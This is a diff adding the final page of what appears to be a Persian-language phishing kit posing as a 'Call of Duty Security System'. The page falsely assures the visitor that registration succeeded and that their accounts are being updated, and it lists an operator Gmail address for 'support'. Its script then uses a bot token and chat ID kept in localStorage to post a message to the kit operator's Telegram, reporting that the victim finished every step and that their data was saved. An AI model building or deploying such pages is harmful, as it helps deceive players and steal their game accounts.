@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>پایان - Call of Duty Security System</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 800px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid #3498db;
+            text-align: center;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            color: #3498db;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(52, 152, 219, 0.7);
+        }
+        
+        h2 {
+            font-size: 1.8rem;
+            color: #e74c3c;
+            margin-bottom: 20px;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            color: #2ecc71;
+            margin: 20px 0;
+            text-shadow: 0 0 20px rgba(46, 204, 113, 0.7);
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .message {
+            background: rgba(46, 204, 113, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #2ecc71;
+        }
+        
+        .contact-info {
+            background: rgba(52, 152, 219, 0.2);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #3498db;
+        }
+        
+        .email {
+            color: #3498db;
+            font-weight: bold;
+            font-size: 1.2rem;
+            direction: ltr;
+            display: block;
+            margin: 10px 0;
+            text-decoration: none;
+        }
+        
+        .email:hover {
+            text-decoration: underline;
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress {
+            height: 100%;
+            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
+            width: 100%;
+            border-radius: 5px;
+            transition: width 0.5s ease;
+        }
+        
+        .progress-text {
+            text-align: center;
+            color: #2ecc71;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        
+        .btn {
+            display: inline-block;
+            margin: 20px 10px;
+            padding: 12px 25px;
+            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 50px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.6);
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #2ecc71 0%, #27ae60 100%);
+            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+        
+        .countdown {
+            font-size: 1.2rem;
+            color: #e74c3c;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Final Comments</h1>
+            <h2>توضیحات پایانی</h2>
+        </header>
+        
+        <div class="success-icon">✅</div>
+        
+        <div class="progress-bar">
+            <div class="progress"></div>
+        </div>
+        <div class="progress-text">100% تکمیل شده</div>
+        
+        <div class="message">
+            <p>ثبت نام شما با موفقیت انجام شد! اکنون شما به سیستم Call of Duty Security System متصل هستید.</p>
+            <p>اکنت ها در حال اپدیت شدن هستن. پس از تأیید نهایی، دسترسی کامل به شما داده خواهد شد.</p>
+        </div>
+        
+        <div class="contact-info">
+            <h3>راه های ارتباطی</h3>
+            <p>اکم بعد گذشت 24 ساعت دیدین کم هنوز دسترسی به سایت ندارید به ایمیل زیر اطلاع دهید:</p>
+            <a href="mailto:shengxphoenix@gmail.com" class="email">shengxphoenix@gmail.com</a>
+            <p>پشتیبانی 24 ساعته پاسخگوی شما خواهد بود.</p>
+        </div>
+        
+        <div class="countdown" id="countdown">5</div>
+        
+        <div>
+            <button class="btn" onclick="restartProcess()">شروع مجدد</button>
+            <button class="btn btn-success" onclick="contactSupport()">تماس با پشتیبانی</button>
+        </div>
+    </div>
+    
+    <footer>
+        Call of Duty Security System | All Rights Reserved 2025 ©
+    </footer>
+
+    <script>
+        // شمارش معکوس برای بستن خودکار صفحه
+        let countdown = 5;
+        const countdownElement = document.getElementById('countdown');
+        
+        const countdownInterval = setInterval(() => {
+            countdown--;
+            countdownElement.textContent = countdown;
+            
+            if (countdown <= 0) {
+                clearInterval(countdownInterval);
+                sendCompletionToTelegram();
+            }
+        }, 1000);
+        
+        function sendCompletionToTelegram() {
+            // اطلاعات تکمیل فرآیند
+            const completionInfo = `
+🎉 فرآیند ثبت نام تکمیل شد
+
+✅ کاربر تمام مراحل را با موفقیت پشت سر گذاشت
+🕒 زمان تکمیل: ${new Date().toLocaleString('fa-IR')}
+📧 ایمیل پشتیبانی: shengxphoenix@gmail.com
+
+💾 اطلاعات کاربر در سیستم ذخیره شد
+            `;
+            
+            // دریافت توکن و چت آیدی از localStorage
+            const token = localStorage.getItem('botToken');
+            const chatId = localStorage.getItem('chatId');
+            
+            if (!token || !chatId) {
+                return;
+            }
+            
+            // ارسال به تلگرام
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: completionInfo
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('اطلاعات تکمیل به تلگرام ارسال شد');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+            
+            // بستن پنجره پس از 2 ثانیه
+            setTimeout(() => {
+                window.close();
+            }, 2000);
+        }
+        
+        function restartProcess() {
+            // هدایت به صفحه اول
+            window.location.href = 'index.html';
+        }
+        
+        function contactSupport() {
+            // باز کردن ایمیل کلاینت
+            window.location.href = 'mailto:shengxphoenix@gmail.com?subject=پشتیبانی Call of Duty Security System&body=لطفاً راهنمایی کنید:';
+        }
+        
+        // بررسی اینکه کاربر از صفحه رضایت آمده یا نه
+        window.onload = function() {
+            const token = localStorage.getItem('botToken');
+            const chatId = localStorage.getItem('chatId');
+            
+            if (!token || !chatId) {
+                alert('لطفاً ابتدا تنظیمات ربات را انجام دهید');
+                window.location.href = 'config.html';
+            } else {
+                // ارسال اطلاعات تکمیل به تلگرام
+                sendCompletionToTelegram();
+            }
+        }
+    </script>
+</body>
+</html>
